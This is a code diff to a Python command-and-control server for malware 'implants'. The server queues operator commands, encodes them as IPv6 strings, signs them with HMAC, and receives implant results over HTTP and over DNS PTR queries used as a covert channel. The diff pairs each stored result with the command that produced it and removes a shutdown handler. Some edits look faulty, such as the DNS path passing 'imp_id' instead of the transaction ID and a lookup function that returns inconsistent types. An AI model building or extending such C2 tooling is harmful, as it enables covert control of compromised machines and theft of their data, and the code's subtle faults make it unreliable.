@@ -1,7 +1,6 @@
 import base64
 import importlib
 import uuid
-import signal
 from dnslib import QTYPE, DNSRecord, RR, PTR
 from urllib.parse import urlparse
 import hashlib
@@ -295,14 +294,14 @@ def get_results_by_implant(user_id, implant_id):
     :return: The entry value if found and removed, or None.
     """
     user_results = result_storage.get(user_id, [])
-    for i, entry in enumerate(user_results):
-        if implant_id in entry:
-            # Remove the entry from the list and return the value
-            value = entry.pop(implant_id)
-            if not entry:  # If the dictionary is empty after pop, remove it from the list
-                user_results.pop(i)
-            return "Implant returned > " + value
-    return "No results currently pending for the provided ID"  # Return None if no matching implant_id is found
+    for dict_store in user_results:
+        if implant_id in dict_store:
+            logger.info("Found the matching implant_id, retrieve lump_result")
+            lump_result = dict_store[implant_id]
+            result, set_command = lump_result
+            return f"Command > '{set_command}' Result > '{result}'"
+
+    return "No matching entry found", None
 
 
 def get_waiting_command(implant_id):
@@ -340,18 +339,18 @@ def get_unique_results_for_user(user_id):
     return unique_client_ids
 
 
-def handle_update(uname, implant_id, result):
+def handle_update(uname, implant_id, result, set_command):
     """
     Handle implants sending results of commands to the server
     :param uname: The user who should get the results
     :param implant_id: The implant ID associated with the command
     :param result: The result sent by the implant
+    :param set_command: The command set to be run
     :return: Boolean: True if success, otherwise returns error
     """
+    logger.info("implant returned data, sending to operator storage")
     try:
-        # decoded_res = ipv6_encoder.ipv6_to_string(result)
-        logger.info(f"first 10 bytes {result[:10]}")
-        dict_store = {implant_id: result}
+        dict_store = {implant_id: (result, set_command)}
         result_storage.setdefault(uname, []).append(dict_store)
         logger.info(f"new result saved for user: {uname}")
         return True
@@ -360,22 +359,18 @@ def handle_update(uname, implant_id, result):
         return e
 
 
-def checkout_command(imp_id, user_id):
+def checkout_command(imp_id, user_id, set_command):
     """
     Creates a queue that has the implant ID as the key and adds the user to it
     Informs the server who needs the latest result
     :param imp_id: The ID for the implant
     :param user_id: The ID for the user who sent the command
+    :param set_command: The command set for the implant
     :return:
     """
+    logger.info(f"checking out a command for {imp_id} by {user_id}")
     implant_checkout.setdefault(imp_id, Queue())
-    implant_checkout[imp_id].put(user_id)
-
-
-# Graceful shutdown handler
-def handle_shutdown(thread_name):
-    print("Shutting down...")
-    thread_name.terminate()
+    implant_checkout[imp_id].put((user_id, set_command))
 
 
 def handle_client(client_socket, client_id):
@@ -540,7 +535,7 @@ def register_routes():
                 if operator and command is False:
                     logger.error("operator and command in queue returned as false")
                     return "error"
-                checkout_command(get_imp_id[0], operator)
+                checkout_command(get_imp_id[0], operator, command)
                 command = json.dumps(ipv6_encoder.string_to_ipv6(command))
                 logger.info("sending command and HMAC to implant")
                 hmac_k = hmac.new(imp_psk1.encode(), command.encode(), hashlib.sha256)
@@ -564,7 +559,7 @@ def register_routes():
                 if operator and command is False:
                     logger.error("operator and command in queue returned as false")
                     return "error"
-                checkout_command(get_imp_id, operator)
+                checkout_command(get_imp_id, operator, command)
                 command = json.dumps(ipv6_encoder.string_to_ipv6(command))
                 logger.info("sending command and HMAC to implant")
                 hmac_k = hmac.new(imp_psk1.encode(), command.encode(), hashlib.sha256)
@@ -590,9 +585,9 @@ def register_routes():
             # Check which operator is waiting for a result
             queue = implant_checkout[imp_id]
             logger.info("got queue for operator")
-            operator = queue.get()
+            operator, set_command = queue.get()
             logger.info(f"sending {operator} command")
-            handle_update(operator, imp_id, result)
+            handle_update(operator, imp_id, result, set_command)
             return "200"
         elif request.content_type == "application/dns-message":
             dns_query = request.data
@@ -625,10 +620,10 @@ def register_routes():
             result = ' '.join(decoded_list)
             # Check which operator is waiting for a result
             queue = implant_checkout[str(transaction_id)]
-            operator = queue.get()
             logger.info("got queue for operator")
+            operator, set_command = queue.get()
             logger.info(f"sending {operator} command")
-            handle_update(operator, transaction_id, result)
+            handle_update(operator, imp_id, result, set_command)
 
             # Send the implant a reply to the PTR request
             response_packet.add_answer(
